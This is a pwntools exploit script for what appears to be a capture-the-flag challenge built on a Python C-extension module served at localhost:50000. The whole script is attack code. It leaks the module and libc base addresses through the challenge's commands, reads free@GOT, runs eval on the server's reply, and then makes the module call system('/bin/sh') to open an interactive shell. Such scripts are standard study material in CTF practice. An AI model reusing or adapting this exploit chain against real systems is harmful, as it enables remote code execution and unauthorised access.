from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe = ELF('/usr/bin/python3')

lib = ELF('../container/chall.cpython-314-x86_64-linux-gnu.so')
libc = ELF('libc.so.6')

gdbscript = '''
c
'''

#io = process([exe.path, "main.py"])
#io = gdb.debug([exe.path, "main.py"], gdbscript)
io = remote('localhost', 50000)

def send(input):
    io.sendlineafter(b'> ', input.encode())
    io.readuntil(b'Result: ')
    return io.readline().strip()

# leak chall.so base thingy
leak = int(send('k'))
log.info(f'Leaked address: {hex(leak)}')
lib.address = leak - 0x2002
log.info(f'chall.so base: {hex(lib.address)}')

# leak libc via free@GOT
leak = u64(eval(send(f'y# {lib.got["free"]} 8')))
libc.address = leak - libc.symbols['free']
log.info(f'libc base: {hex(libc.address)}')

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
log.info(f'system: {hex(system)}')
log.info(f'/bin/sh: {hex(binsh)}')

# O& calls converter(arg) -> system("/bin/sh")
io.sendlineafter(b'> ', f'O& {system} {binsh}'.encode())

io.interactive()
